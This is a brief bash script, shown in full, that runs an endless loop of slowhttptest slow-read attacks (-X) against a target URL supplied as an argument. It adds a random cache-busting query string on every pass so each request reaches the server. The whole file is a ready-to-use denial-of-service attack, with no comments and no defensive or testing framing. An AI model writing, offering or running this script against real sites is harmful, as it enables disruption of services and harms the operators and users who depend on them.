#!/bin/bash

while true
do
    str=$(date +%s | sha256sum | base64 | head -c 25)
    url="$1?s=$str"
    echo $url
	slowhttptest -X -l 25 -u $url
done
